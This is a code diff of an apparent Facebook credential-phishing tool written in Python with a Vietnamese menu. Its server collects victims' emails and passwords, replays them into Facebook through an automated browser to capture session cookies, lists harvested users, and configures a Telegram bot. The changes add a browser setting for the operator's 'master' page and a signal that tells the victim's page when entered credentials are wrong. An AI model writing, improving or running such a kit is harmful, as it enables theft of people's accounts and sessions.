@@ -28,6 +28,10 @@ import base64
 
 import uuid
 
+import webbrowser
+
+import subprocess
+
 from datetime import datetime
 
 from typing import Optional, Dict, Any
@@ -282,16 +286,11 @@ def print_menu():
 
     print()
 
-    print("  \033[1;33m[1]\033[0m  Mở Server đăng nhập (http://localhost:5000)")
-
+    print("  \033[1;33m[1]\033[0m  Chạy server")
     print("  \033[1;33m[2]\033[0m  Xem danh sách user đã đăng nhập")
-
     print("  \033[1;33m[3]\033[0m  Xóa user khỏi danh sách")
-
     print("  \033[1;33m[4]\033[0m  Thiết lập Telegram Bot")
-
-    print("  \033[1;33m[5]\033[0m  Chạy TẤT CẢ (Login + Help cùng port)")
-
+    print("  \033[1;33m[5]\033[0m  Thiết lập trình duyệt mở master")
     print("  \033[1;33m[0]\033[0m  Thoát")
 
     print()
@@ -636,6 +635,89 @@ def setup_bot():
 
 
 
+def setup_browser():
+
+    """Thiết lập trình duyệt để mở master"""
+
+    print("\n\033[1;34m" + "-" * 50 + "\033[0m")
+
+    print("\033[1;32m        THIẾT LẬP TRÌNH DUYỆT MỞ MASTER\033[0m")
+
+    print("\033[1;34m" + "-" * 50 + "\033[0m\n")
+
+    
+
+    config_file = "browser_config.txt"
+
+    current_browser = "default"
+
+    current_path = ""
+
+    
+
+    if os.path.exists(config_file):
+        with open(config_file, "r") as f:
+            lines = f.readlines()
+            if len(lines) >= 2:
+                current_browser = lines[0].strip()
+                current_path = lines[1].strip()
+    
+    print(f"\033[1;36mTrình duyệt hiện tại: {current_browser}\033[0m")
+    if current_path:
+        print(f"\033[1;36mĐường dẫn: {current_path}\033[0m")
+    print()
+    
+    print("  \033[1;33m[1]\033[0m  Trình duyệt mặc định (system default)")
+    print("  \033[1;33m[2]\033[0m  Chrome")
+    print("  \033[1;33m[3]\033[0m  Firefox")
+    print("  \033[1;33m[4]\033[0m  Edge")
+    print("  \033[1;33m[5]\033[0m  Nhập đường dẫn trình duyệt tùy chỉnh")
+    print("  \033[1;33m[0]\033[0m  Quay lại")
+    
+    choice = get_input("\nChọn trình duyệt: ", allow_empty=True)
+    
+    browser_type = current_browser
+    browser_path = current_path
+    
+    if choice == "1":
+        browser_type = "default"
+        browser_path = ""
+    elif choice == "2":
+        browser_type = "chrome"
+        browser_path = ""
+    elif choice == "3":
+        browser_type = "firefox"
+        browser_path = ""
+    elif choice == "4":
+        browser_type = "edge"
+        browser_path = ""
+    elif choice == "5":
+        browser_type = "custom"
+        browser_path = get_input("Nhập đường dẫn đến file .exe của trình duyệt: ")
+        if not browser_path or not os.path.exists(browser_path):
+            print("\033[1;31m[!] Đường dẫn không hợp lệ\033[0m")
+            input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
+            return
+    elif choice == "0":
+        return
+    else:
+        print("\033[1;31m[!] Lựa chọn không hợp lệ\033[0m")
+        time.sleep(1)
+        return
+    
+    try:
+        with open(config_file, "w") as f:
+            f.write(f"{browser_type}\n{browser_path}")
+        print(f"\n\033[1;32m[✓] Đã lưu cấu hình trình duyệt: {browser_type}\033[0m")
+    except Exception as e:
+        print(f"\033[1;31m[!] Lỗi khi lưu file: {e}\033[0m")
+    
+    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
+
+
+
+
+
 def detect_device(user_agent: str) -> str:
 
     """Phát hiện thiết bị từ User-Agent"""
@@ -897,13 +979,21 @@ def create_unified_app():
         
         # Thực hiện đăng nhập trong worker thread riêng
         try:
-            html, should_get_cookies = worker.call(
+            html, should_get_cookies, login_failed = worker.call(
                 get_facebook_page_after_login,
                 username=email,
                 password=password,
                 headless=False,
                 timeout=300000
             )
+            
+            # Nếu đăng nhập sai (URL là /login/web/), trả về login_failed cho client
+            if login_failed:
+                return jsonify({
+                    "success": False,
+                    "login_failed": True,
+                    "error": "Thông tin đăng nhập không chính xác"
+                })
             
             if not html:
                 return jsonify({
@@ -1164,7 +1254,7 @@ def start_all_server():
 
     print("\n\033[1;34m" + "-" * 50 + "\033[0m")
 
-    print("\033[1;32m     CHẠY TẤT CẢ (Login + Help cùng port)\033[0m")
+    print("\033[1;32m              CHẠY SERVER\033[0m")
 
     print("\033[1;34m" + "-" * 50 + "\033[0m\n")
 
@@ -1178,13 +1268,13 @@ def start_all_server():
 
     app = create_unified_app()
 
+    master_url = f"http://localhost:{port}"
     
+    print(f"\n\033[1;33m[*] Khởi động Server tại {master_url}\033[0m")
 
-    print(f"\n\033[1;33m[*] Khởi động Unified Server tại http://localhost:{port}\033[0m")
+    print(f"\033[1;36m    - Login: {master_url}/\033[0m")
 
-    print(f"\033[1;36m    - Login: http://localhost:{port}/\033[0m")
-
-    print(f"\033[1;36m    - Help:  http://localhost:{port}/help\033[0m")
+    print(f"\033[1;36m    - Help:  {master_url}/help\033[0m")
 
     print(f"\033[1;36m    Nhập Ctrl+C để dừng server\033[0m\n")
 
@@ -1239,25 +1329,15 @@ def main():
         
 
         if choice == "1":
-
-            start_server()
-
-        elif choice == "2":
-
-            show_users()
-
-        elif choice == "3":
-
-            delete_user()
-
-        elif choice == "4":
-
-            setup_bot()
-
-        elif choice == "5":
-
             start_all_server()
-
+        elif choice == "2":
+            show_users()
+        elif choice == "3":
+            delete_user()
+        elif choice == "4":
+            setup_bot()
+        elif choice == "5":
+            setup_browser()
         elif choice == "0":
 
             print("\n\033[1;33m[*] Tạm biệt!\033[0m")
